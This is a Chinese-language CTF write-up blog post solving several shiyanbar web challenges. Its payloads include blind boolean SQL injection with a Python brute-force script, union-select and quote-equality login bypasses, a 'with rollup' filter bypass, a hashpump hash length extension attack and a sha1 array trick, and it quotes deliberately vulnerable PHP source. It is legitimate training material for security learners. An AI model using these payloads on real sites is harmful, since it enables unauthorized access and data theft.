+<p>可以利用bool型注入，构造payload：<code>?id=1&#39; and ascii(substr((select flag from flag limit 1),1,1))=102 %23</code></p>
+<p>可以显示<code>Hello!</code>，将102改成其他数值就没有返回值。</p>
+<p>利用python脚本获得flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/index_3.php?id=&#x27;</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">  url1=url+payload   </span><br><span class="line">  r = requests.get(url1).content    </span><br><span class="line">  <span class="comment">#print r</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">32</span>):    </span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> s:        </span><br><span class="line">    payload = <span class="string">&#x27;1\&#x27; and ascii(substr((select flag from flag limit 1),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(c))+<span class="string">&#x27; %23&#x27;</span>       </span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    <span class="keyword">if</span> check(payload):</span><br><span class="line">      flag += c            </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span> flag</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">break</span>    </span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</code></p>
+<h3 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h3><p>题目:<a href="http://www.shiyanbar.com/ctf/1788">http://www.shiyanbar.com/ctf/1788</a></p>
+<p>网页上方随机生成的三个随机数，一个输入框，还给出了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>((<span class="title function_ invoke__">microtime</span>() ^ <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>)) % <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) + <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>get参数password，与session的参数比较，相等就输出flag。</p>
+<p>这题思路猥琐。。。随机数都是骗人的，让两者都为空就行了。</p>
+<p>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。</p>
+<p>payload:<code>?password=  cookie:phpsessid=</code></p>
+<p>flag:<code>CTF&#123;Cl3ar_th3_S3ss1on&#125;</code></p>
+<h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/62">http://www.shiyanbar.com/ctf/62</a></p>
+<p>查看网页源代码，提示index.txt文件，访问看到源代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">  <span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;********&quot;</span>, <span class="string">&quot;*****&quot;</span>, <span class="string">&quot;********&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;phpformysql&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not select database&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysql_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">  &#125; </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pw from php where user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, <span class="title function_ invoke__">mysql_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row[&quot;pw&quot;];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>post参数username passowrd，查询username对应的password，并将输入的password值的md5值与数据库中的password值比较，一样就输出key。</p>
+<p>我们输入的password值是可控的，$sql也需要是可控的。</p>
+<p>查询语句是<code>select pw from php where user=&#39;$user&#39;</code>，我们可以通过闭合等构造sql语句来让$sql变量可控。</p>
+<p>让<code>username=username&#39; union select md5(1)#</code>，查询语句就变成了<code>select pw from php where user=&#39;username&#39; union select md5(1)#&#39;</code>，就达到了目的，让<code>row[pw]</code>变成了1的md5值，再让password&#x3D;1就可以得到flag。</p>
+<p>flag：<code>SimCTF&#123;youhaocongming&#125;</code></p>
+<h3 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1942">http://www.shiyanbar.com/ctf/1942</a></p>
+<p>思路清奇，手工测试了一下，过滤了<code>or , union , # , select ,* ,/</code>，好像是都被过滤了。没办法看了看writeup。</p>
+<p>payload是<code>username=1&#39;=&#39;0&amp;password=1&#39;=&#39;0</code></p>
+<p>猜测sql查询语句是这样的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select user from flag where user=&#x27;<span class="subst">$_POST</span>[&#x27;user&#x27;]&#x27; and password=&#x27;<span class="subst">$_POST</span>[&#x27;password&#x27;]&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果按照上面的参数就变成了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select user from flag where user=&#x27;1&#x27;=&#x27;0&#x27; and password=&#x27;=1&#x27;=&#x27;0&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>user&#x3D;1返回的是0&#x3D;0,符合条件的，最后就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = “select user <span class="keyword">from</span> flag where <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>”;</span><br></pre></td></tr></table></figure>
+
+<p>就可以登陆进去了。</p>
+<p>flag：<code>ctf&#123;51d1bf8fb65a8c2406513ee8f52283e7&#125;</code></p>
+<h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1848">http://www.shiyanbar.com/ctf/1848</a></p>
+<p>先用burpsuite抓包，发现setcookie中有source&#x3D;0，在cookie中赋值，将其改为1，得到源代码。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.7.25/hash1.png" alt="hash1"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;XXXXXXXXXXXXXXX&quot;</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;sample-hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;source&quot;</span>, <span class="number">0</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</span><br></pre></td></tr></table></figure>
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e18dfd8404515016d3aeeea2aa196909</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure>
+<p>将<code>\x</code>换成<code>%</code>并填入对应位置。<br><img src="https://github.com/Windylh/image/raw/master/2017.7.25/hash2.png" alt="hash2"></p>
+<p>flag：<code>CTF&#123;cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther&#125;</code></p>
+<h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1940">http://www.shiyanbar.com/ctf/1940</a></p>
+<p>查看源代码，在注释中提示我们看source.txt，获得源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;!--source: source.txt--&gt;&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span>(<span class="params"><span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrValue</span>)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;水可载舟，亦可赛艇！&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    <span class="title function_ invoke__">AttackFilter</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;XXXXXX&quot;</span>,<span class="string">&quot;XXXXXX&quot;</span>,<span class="string">&quot;XXXXXX&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">&quot;XXXXXX&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;pwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;CTF&#123;XXXXXX&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;亦可赛艇！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;一颗赛艇！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysql_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>$filter &#x3D; “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</strong></p>
+<p>经过AttackFilter()函数过滤了这些关键字，所以还有关键字的就不用想了。</p>
+<p>要输出flag就要满足<code>mysql_num_rows($query) == 1</code>、<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p>
+<p>没啥思路，看了看dalao的<a href="http://blog.csdn.net/qq_35078631/article/details/54772798">writeup</a>。</p>
+<p><code>mysql_num_rows()函数返回结果集中行的数目。</code>我们构造uname让sql语句查询出来的结果是一行就能绕过。<code>Uname = &#39;or 1 limit 1#</code>，这样sql语句就是<code>SELECT * FROM interest WHERE uname = &#39;&#39;or 1 limit 1#</code>，这样就查询1行，也就能绕过第一个条件。</p>
+<p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 &#x3D;&#x3D;，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，其实就是一个关键字 with rollup 他经常和group by搭配，用来统计。使用了with rollup数据会多一列，显示统计信息，对应的pwd参数是NULL。用<code>OFFSET</code>参数来跳过前面的数据。最后构造的参数就是<code>uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET xx#</code>，xx是猜测的数字。</p>
+<p>payload:<code>uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET 2#</code></p>
+<p>flag：<code>CTF&#123;with_rollup_interesting&#125;</code></p>
+<h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1787">http://www.shiyanbar.com/ctf/1787</a></p>
+<p>题目给出了登录框，点击view source查看源代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。</p>
+<p>这里可以运用数组绕过，<strong>sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE</strong>，让两个参数都为数组的形式，就可以<code>FALSE===FALSE</code>，输出flag。</p>
+<p>payload:<code>?name[]=1&amp;password[]=2</code></p>
+<p>flag:<code>CTF&#123;t3st_th3_Sha1&#125;</code></p>
+<h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1819">http://www.shiyanbar.com/ctf/1819</a></p>
+<p>查看网页源代码。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;showsource&quot;</span> <span class="attr">value</span>=<span class="string">0</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将type中的hidden去掉，并赋值value&#x3D;1，提交，就能看到源代码了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;PIN&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == -<span class="number">19827747736161128312837161661727773716166727272616149001823847</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Congratulations! The flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User with provided PIN not found.&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>让a等于对应的数字，就能得到flag。</p>
+<p>flag：<code>ctf&#123;forms_are_easy&#125;</code></p>
+<h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/2">http://www.shiyanbar.com/ctf/2</a></p>
+<p>题目是一个登陆页面，有回显，用admin，admin测试，发现提示<code>登录失败，错误的用户名和密码</code>，当用户名改为其他时，提示<code>数据库连接失败！</code>，猜测是bool型注入。</p>
+<p>先查询passowrd的位数，<code>?admin=admin&#39; AND length(password)=8 -- &amp;pass=admin&amp;action=login</code>，password有8位，就可以用python脚本爆破了！</p>
